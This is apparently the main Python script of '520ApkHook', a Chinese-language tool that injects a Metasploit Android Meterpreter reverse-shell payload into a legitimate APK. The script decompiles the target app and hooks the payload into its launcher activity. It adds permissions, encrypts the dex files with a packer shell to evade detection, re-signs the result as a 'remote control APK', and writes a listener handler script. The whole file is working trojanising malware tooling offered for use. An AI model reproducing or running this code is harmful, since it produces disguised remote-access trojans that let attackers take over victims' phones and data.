#!/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import re
import sys
import time
import argparse
import subprocess

try:
    import rich, Crypto
except ModuleNotFoundError as e:
    print('\n[!] 遇到致命错误!')
    print('\n[!] 模块rich, pycryptodome未安装, 请在终端中执行命令`pip3 install rich pycryptodome`进行安装.\n')
    print('[!] 程序已结束!\n\n\tGood Bay !\n')
    exit()

from utils.config import OPTIONS
from utils.ZipApkFile import ZipApkFile
from utils.CreateMsfDex import CreateMsfDex
from utils.JarCommand import JarCommand
from utils.EncryptFile import EncryptFile
from utils.InjectMsf2App import InjectMsf2App
from utils.CustomPrint import CustomPrint
from utils.CopyJniFile import CopyTree


from shutil import copyfile, rmtree

LOGO = r'''

    ______ ___   ____   ___            __    __  __               __  
   / ____/|__ \ / __ \ /   |   ____   / /__ / / / /____   ____   / /__
  /___ \  __/ // / / // /| |  / __ \ / //_// /_/ // __ \ / __ \ / //_/
 ____/ / / __// /_/ // ___ | / /_/ // ,<  / __  // /_/ // /_/ // ,<   
/_____/ /____/\____//_/  |_|/ .___//_/|_|/_/ /_/ \____/ \____//_/|_|  
                           /_/                                        

'''

def GetArguments():
    parser = argparse.ArgumentParser(description=f'520ApkHook Apk注入工具 v1.1')
    parser._optionals.title = f"参数说明"

    required_arguments = parser.add_argument_group(f'Required Arguments')
    required_arguments.add_argument("--lhost", dest="lhost", help="msf的IP地址", required=True)
    required_arguments.add_argument("--lport", dest="lport", help="msf的端口", required=True)
    required_arguments.add_argument("-p", "--payload", dest="payload", help="msf的Payload类型\nandroid/meterpreter/reverse_tcp|http|https", required=True)
    required_arguments.add_argument("-n", "--normal-apk", dest="normalapk", help="进行注入的apk文件", required=True)

    return parser.parse_args()

def ReslovePath(*args):
    return os.path.abspath(os.path.join(*args))

def AddSleep():
    time.sleep(3)

def ExitScript():
    print('')
    Print.PrintSuccess('程序已结束! Good Bay !\n')
    exit()

def MyExceptHook(exctype, value, traceback):
    if exctype == KeyboardInterrupt:
        Print.PrintError(f'你已主动退出程序...')
        ExitScript()
    else:
        sys.__excepthook__(exctype, value, traceback)

def CheckEnv():
    AddSleep()
    CheckJavaVersion()

def CheckJavaVersion():
    (out, err)= subprocess.Popen(f'{JavaCommand} -version', stdout=subprocess.PIPE, shell=True, stderr=subprocess.STDOUT).communicate()
    if 'version' not in out.decode():
        Print.PrintError(f'系统中未安装java环境，或者配置了错误的java路径`{JavaCommand}`,请修改`utils/config.py`文件中JavaPath对应值...\n')
        ExitScript()

def MkDir(**kwargs):

    if os.path.exists(kwargs['TestDir']):
        rmtree(kwargs['TestDir'])

    for _ in kwargs['MakeDirs']:
        os.mkdir(_)
    AddSleep()

def MkTestDir():
    Print.PrintInfo(f'创建临时文件目录...')
    MakeDirs = [TestDir, TestDirApkFile, TestDirDexFile, TestDirUnZipApkPath, TestDirAppUnSmaliPath, TestDirMsfUnSmaliPath, TestDirUnZipXmlPath]
    Print.PrintStatus(
        f'正在创建临时文件夹...',
        MkDir,
        TestDir=TestDir,
        MakeDirs=MakeDirs
    )
    Print.PrintDirTree(TestDir, 4)
    Print.PrintSuccess(f'临时文件目录创建成功!\n')

def UnzipApk(apkpath):
    Print.PrintInfo(f'解压需要注入App...')
    apk = ZipApkFile(apkpath, 'r', OPTIONS)
    Print.PrintStatus(
        f'开始解压{apkpath}...',
        apk.UnZipApk,
    )
    Print.PrintDirTree(TestDirApkFile, 3)
    Print.PrintSuccess(f'注入App`{apkpath}`解压成功!\n')

def CreateMsf():
    Print.PrintInfo(f'构建msf dex文件, 创建Msf handler.rc...')
    msf = CreateMsfDex(MsfPayload, MsfLHost, MsfLPort, OPTIONS)
    CreateMsfHandler()
    Print.PrintStatus(
        f'开始构建msf dex文件, 创建Msf handler.rc...',
        msf.Generate
    )
    Print.PrintDirTree(TestDirDexFile, 3)
    Print.PrintSuccess(f'msf dex文件构建成功! 保存在`{MsfBuildDexFile}`')
    Print.PrintSuccess(f'Msf handler.rc构建成功! 保存在`{MsfHandler}`\n')

def CopyUnZipApkFile():
    Print.PrintInfo(f'复制Apk解压的dex文件...')
    for _ in os.listdir(TestDirUnZipApkPath):
        AppDexFile = ReslovePath(TestDirUnZipApkPath, _)
        if AppDexFile.endswith('.dex') :
            copyfile(AppDexFile, ReslovePath(TestDirAppUnSmaliPath, _))
    Print.PrintStatus(
        f'正在复制Apk解压的dex文件...',
        AddSleep
    )
    Print.PrintDirTree(TestDirDexFile, 3)
    Print.PrintSuccess(f'App解压的dex文件复制成功!\n')

def DecodeAndroidManifest():
    Print.PrintInfo(f'准备解码App的AndroidManifest.xml文件...')
    DecodeAndroidManifestPath = ReslovePath(TestDirUnZipXmlPath, 'AndroidManifest_Decode.xml')
    AndroidManifestPath = ReslovePath(TestDirUnZipApkPath, 'AndroidManifest.xml')

    Jar = JarCommand(OPTIONS)
    Print.PrintStatus(
        f'解码App的{AndroidManifestPath}中...',
        Jar.Xml2Axml,
        androidmanifestfile=AndroidManifestPath,
        androidmanifestdecodefile=DecodeAndroidManifestPath
    )
    Print.PrintDirTree(TestDirUnZipXmlPath, 3)
    Print.PrintSuccess(f'解码AndroidManifest.xml文件成功，保存在`{DecodeAndroidManifestPath}`\n')

def BakSmaliDexFile():
    Print.PrintInfo(f'准备反编译msf的dex文件...')
    Jar = JarCommand(OPTIONS)
    MsfSmaliPath = ReslovePath(TestDirMsfUnSmaliPath, 'classes')
    Print.PrintStatus(
        f'正在反编译msf的dex文件...',
        Jar.Dex2Smail,
        dexfilepath=MsfBuildDexFile,
        smalidirpath=MsfSmaliPath
    )
    Print.PrintDirTree(TestDirDexFile, 3)
    Print.PrintSuccess(f'反编译msf的dex文件成功，保存在`{TestDirMsfUnSmaliPath}`\n')

    Print.PrintInfo(f'准备反编译App的dex文件...')
    for _ in os.listdir(TestDirUnZipApkPath):
        AppDexFile = ReslovePath(TestDirUnZipApkPath, _)
        AppSmaliPath = os.path.splitext(ReslovePath(TestDirAppUnSmaliPath, _))[0]
        if AppDexFile.endswith('.dex') :
            Print.PrintStatus(
                f'正在反编译App的{_}文件...',
                Jar.Dex2Smail,
                dexfilepath=AppDexFile,
                smalidirpath=AppSmaliPath
            )
    Print.PrintDirTree(TestDirDexFile, 3)
    Print.PrintSuccess(f'反编译App的dex文件成功，保存在`{TestDirAppUnSmaliPath}`\n')

def InjectMsf2Apk():
    Print.PrintInfo(f'准备将msf的smali文件注入到App中...')
    Inject = InjectMsf2App(OPTIONS)
    DecodeAndroidManifestPath = ReslovePath(TestDirUnZipXmlPath, 'AndroidManifest_Decode.xml')
    InjectMsfSmaliPath = ReslovePath(TestDirMsfUnSmaliPath, 'classes')

    AppLauncherActivity, MoveAppLauncherActivityClassPath, InjectAppLauncherActivitSmaliPath = Inject.GetAppLauncherActivityFile(appdexpath=TestDirAppUnSmaliPath, androidmanifestfile=DecodeAndroidManifestPath)
    VARS = Inject.RandomMsfSmali(msfsmalipath=InjectMsfSmaliPath)

    i = 0
    while True:
        ChangeCode = Inject.InjectMsf2SmaliFile(vars=VARS, injectapplauncheractivitsmalipath=InjectAppLauncherActivitSmaliPath)

        if ChangeCode == False and i == 0:
            Print.PrintError(f'不能在`{InjectAppLauncherActivitSmaliPath}`中找到App默认启动组件`.method public onCreate()V`, 无法将Msf注入App! 请分析此文件逻辑，找到默认启动组件所在的smali文件. 请参考`https://github.com/cleverbao/520apkhook/issues/1`.\n')
            Print.PrintInfo(f'是否找到App默认启动组件? 输入`n/N`退出程序.\n')
            SmaliPath = Print.PrintInput(f'Input').strip()
            print()
            i += 1
        elif ChangeCode == False and i > 1:
            SmaliPath = Print.PrintInput(f'Input').strip()
        else:
            if i > 0:
                Print.PrintSuccess(f'你已输入正确的smali文件`{InjectAppLauncherActivitSmaliPath}`, 程序继续...')
            break
        if SmaliPath == 'n' or SmaliPath == 'N' or SmaliPath == '':
            Print.PrintError(f'你已选择退出程序...')
            ExitScript()
        if os.path.exists(SmaliPath) :
            InjectAppLauncherActivitSmaliPath = SmaliPath
        else:
            Print.PrintError(f'输入的文件不存在, 请重试...\n')
    Inject.CopyMsfSmali2AppSmali(vars=VARS, msfsmalipath=InjectMsfSmaliPath, moveapplauncheractivityclasspath=MoveAppLauncherActivityClassPath)

    Print.PrintStatus(
        f'正在将msf的smali文件注入到App中...',
        Inject.AddSleep
    )
    Print.PrintLogo(f'\n修改代码: {ChangeCode}')
    Print.PrintSuccess(f'成功将msf的smali文件注入到App中，主要修改`{InjectAppLauncherActivitSmaliPath}`文件.\n')

def EditorAndroidManifest():
    Print.PrintInfo(f'准备注入msf权限和壳信息到AndroidManifest.xml中...')
    Inject = InjectMsf2App(OPTIONS)
    DecodeAndroidManifestPath = ReslovePath(TestDirUnZipXmlPath, 'AndroidManifest_Decode.xml')
    InjectMsfSmaliPath = ReslovePath(TestDirMsfUnSmaliPath, 'classes')

    AppLauncherActivity, MoveAppLauncherActivityClassPath, InjectAppLauncherActivitSmaliPath = Inject.GetAppLauncherActivityFile(appdexpath=TestDirAppUnSmaliPath, androidmanifestfile=DecodeAndroidManifestPath)

    Jar = JarCommand(OPTIONS)
    AndroidManifestPath = ReslovePath(TestDirUnZipApkPath, 'AndroidManifest.xml')
    NewAndroidManifestPath = ReslovePath(TestDirUnZipXmlPath, 'NewAndroidManifest.xml')

    AndroidManifestOption = f'-an {SteadyLauncherActivity} -md app_name:{AppLauncherActivity} '
    for UsesPermission in OPTIONS['UsesPermission']:
        AndroidManifestOption += f'-up {UsesPermission} '

    Print.PrintStatus(
        f'正在注入msf权限和壳信息到AndroidManifest.xml中...',
        Jar.ManifestEditor,
        androidmanifestfile=AndroidManifestPath,
        newandroidmanifestfile=NewAndroidManifestPath,
        xmloptionscommand=AndroidManifestOption
    )
    Print.PrintDirTree(TestDirDexFile, 3)
    Print.PrintSuccess(f'成功将msf权限和壳信息注入App的AndroidManifest.xml，生成新文件`{NewAndroidManifestPath}`文件.\n')

def RestoreApp():
    Print.PrintInfo(f'准备编译还原App的smali文件为dex文件...')
    Jar = JarCommand(OPTIONS)

    for _ in os.listdir(TestDirAppUnSmaliPath):
        AppSmaliPath = ReslovePath(TestDirAppUnSmaliPath, _)
        AppDexFile = ReslovePath(TestDirAppUnSmaliPath, f'{_}.dex')
        if os.path.isdir(AppSmaliPath):
            Print.PrintStatus(
                f'正在编译还原{_}为dex文件...',
                Jar.Smail2Dex,
                dexfilepath=AppDexFile,
                smalidirpath=AppSmaliPath
            )
    Print.PrintDirTree(TestDirDexFile, 3)
    Print.PrintSuccess(f'编译还原App的smali文件为dex文件成功，保存在`{TestDirAppUnSmaliPath}`\n')

def EnCryptDexFile():
    Print.PrintInfo(f'准备对新生成的dex文件进行加壳...')
    Cryptor = EncryptFile(OPTIONS)
    for _ in os.listdir(TestDirAppUnSmaliPath):
        AppDexFile = ReslovePath(TestDirAppUnSmaliPath, _)
        if os.path.isfile(AppDexFile):
            Print.PrintStatus(
                f'正在对{_}文件进行加壳...',
                Cryptor.EnCryptDexFile,
                olddexfile=AppDexFile,
                newdexfile=f'{AppDexFile}.EnCrypt'
            )
    Print.PrintDirTree(TestDirDexFile, 3)
    Print.PrintSuccess(f'对新生成的dex文件进行加壳成功，保存在`{TestDirAppUnSmaliPath}`\n')

def CopyDexJniFile():
    Print.PrintInfo(f'准备复制加密后的dex文件和注入后的AndroidManifest.xml到App目录...')
    InjectAndroidManifestPath = ReslovePath(TestDirUnZipXmlPath, 'NewAndroidManifest.xml')
    AppAndroidManifestPath = ReslovePath(TestDirUnZipApkPath, 'AndroidManifest.xml')
    copyfile(InjectAndroidManifestPath, AppAndroidManifestPath)
    for _ in os.listdir(TestDirAppUnSmaliPath):
        AppDexFile :str = ReslovePath(TestDirAppUnSmaliPath, _)
        if AppDexFile.endswith('.EnCrypt') :
            DexName :str = os.path.basename(AppDexFile).split('.')[0]
            ReSearch = re.search(r'classes(\d)', DexName)
            if ReSearch:
                NewNum = int(ReSearch[1]) + 1
                NewDexFile = ReslovePath(TestDirUnZipApkPath, f'classes{NewNum}.dex')
            else:
                NewDexFile = ReslovePath(TestDirUnZipApkPath, f'classes2.dex')
            copyfile(AppDexFile, NewDexFile)
    Print.PrintStatus(
        f'正在复制加密后的dex文件和注入后的AndroidManifest.xml到App目录...',
        AddSleep
    )
    Print.PrintDirTree(TestDirUnZipApkPath, 2)
    Print.PrintSuccess(f'复制加密后的dex文件和注入后的AndroidManifest.xml到App目录成功，保存在`{TestDirUnZipApkPath}`\n')

    Print.PrintInfo(f'准备复制steady的壳文件到App目录...')
    CopyAppDexFile = ReslovePath(TestDirUnZipApkPath, 'classes.dex')
    CopyAppLibPath = ReslovePath(TestDirUnZipApkPath, 'lib')
    copyfile(SteadyDexFile, CopyAppDexFile)
    CopyTree(SteadyLibFile, CopyAppLibPath)
    Print.PrintStatus(
        f'正在复制steady的壳文件到App目录...',
        AddSleep
    )

    Print.PrintDirTree(CopyAppLibPath, 2)
    Print.PrintSuccess(f'复制steady的壳文件到App目录成功，保存在`{CopyAppLibPath}`\n')

def ZipNewApkFile():
    Print.PrintInfo(f'准备打包注入完成的Apk文件...')

    Zip = ZipApkFile(ZipFinishApk, 'w', OPTIONS)
    Print.PrintStatus(
        f'正在打包注入完成的Apk文件...',
        Zip.ZipApk
    )
    Print.PrintDirTree(TestDir, 3)
    Print.PrintSuccess(f'打包注入完成的Apk文件成功，保存在`{ZipFinishApk}`\n')

def ApkSigner():
    Print.PrintInfo(f'准备对打包的Apk文件进行签名...')

    Jar = JarCommand(OPTIONS)
    Print.PrintStatus(
        f'正在对打包的{ZipFinishApk}文件进行签名...',
        Jar.ApkSigner,
        apkfilepath=ZipFinishApk
    )
    Print.PrintDirTree(TestDir, 3)
    Print.PrintSuccess(f'对打包的Apk文件进行签名成功，保存在`{ZipFinishApk}`\n')

def CreateMsfHandler():

    if MsfPayload in ['android/meterpreter/reverse_http', 'android/meterpreter/reverse_https']:
        MsfPayloadType = MsfPayload
    else:
        MsfPayloadType = 'android/meterpreter/reverse_tcp'
    with open(MsfHandler,"w") as handler:
        handler.write("use exploit/multi/handler\n")
        handler.write(f"set payload {MsfPayloadType}\n")
        handler.write("set LHOST 0.0.0.0\n")
        handler.write(f"set LPORT {MsfLPort}\n")
        handler.write("set exitonsession false\n")
        handler.write("exploit -j")


if __name__ == '__main__':
    sys.excepthook = MyExceptHook
    Print = CustomPrint()
    Print.PrintLogo(LOGO)

    Arguments = GetArguments()
    InjectNormalApk = Arguments.normalapk
    MsfPayload = Arguments.payload.strip()
    MsfLHost = Arguments.lhost.strip()
    MsfLPort = Arguments.lport.strip()

    if not os.path.exists(InjectNormalApk):
        Print.PrintError(f"[需要注入的apk文件不存在,请检查`-n/--normal-apk`参数!\n")
        ExitScript()

    InjectNormalApk = ReslovePath(InjectNormalApk)

    TestDir = ReslovePath(OPTIONS['TestDir'])
    TestDirApkFile = ReslovePath(OPTIONS['TestDirApkFile'])
    TestDirDexFile = ReslovePath(OPTIONS['TestDirDexFile'])
    TestDirUnZipApkPath = ReslovePath(OPTIONS['TestDirUnZipApkPath'])
    TestDirAppUnSmaliPath = ReslovePath(OPTIONS['TestDirAppUnSmaliPath'])
    TestDirMsfUnSmaliPath = ReslovePath(OPTIONS['TestDirMsfUnSmaliPath'])
    TestDirUnZipXmlPath = ReslovePath(OPTIONS['TestDirUnZipXmlPath'])

    MsfBuildDexFile = ReslovePath(OPTIONS["MsfBuildDexFile"])

    UsesPermission = OPTIONS['UsesPermission']
    SteadyLauncherActivity = OPTIONS['SteadyLauncherActivity']

    SteadyDexFile = ReslovePath(OPTIONS['SteadyDexFile'])
    SteadyLibFile = ReslovePath(OPTIONS['SteadyLibFile'])

    ZipFinishApk = ReslovePath(OPTIONS['ZipFinishApk'])

    MsfHandler = ReslovePath(OPTIONS['MsfHandler'])

    JavaCommand = OPTIONS['JavaPath']

    Print.PrintStatus(
        f'正在检查环境信息...', 
        CheckEnv
    )

    Print.PrintRule('开始进行准备工作...', 'green bold')
    Print.PrintSuccess(f'获取到需要进行注入的app程序!\n')
    MkTestDir()
    UnzipApk(InjectNormalApk)
    CreateMsf()
    DecodeAndroidManifest()
    Print.PrintSuccess(f'准备工作已完成!\n')

    Print.PrintRule('开始进行注入工作...', 'blue bold')
    BakSmaliDexFile()
    InjectMsf2Apk()
    EditorAndroidManifest()
    RestoreApp()
    EnCryptDexFile()
    CopyDexJniFile()
    Print.PrintSuccess(f'注入工作已完成!\n')


    Print.PrintRule('开始进行结尾工作...', 'red bold')
    ZipNewApkFile()
    ApkSigner()
    Print.PrintRule(f'所有工作已完成! ')

    print('')
    Print.PrintError(f'生成的远控Apk在: {ZipFinishApk}\n')
    Print.PrintError(f'生成的Msf Handler在: {MsfHandler}\n')

    ExitScript()
